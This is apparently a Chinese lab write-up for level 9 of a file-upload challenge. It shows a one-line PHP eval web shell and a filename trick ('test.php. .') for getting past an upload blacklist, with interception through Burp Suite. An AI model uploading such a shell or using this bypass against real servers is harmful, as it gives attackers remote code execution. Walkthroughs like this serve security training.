## 解题wp(By:独立团孙德胜Alan)
本pass可以通过增加点的方式绕过，注意，此Pass需要修改PHP环境为5.2.17

## 1.打开第九关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)

#### 提示不允许上传

## 3.分析代码

##### ![](./img/3.png)

##### 上传test.php. .(php后面加上点空格点)

## 4.我们可以使用Burpsutie抓包，利用特性绕过

![](./img/4.png)

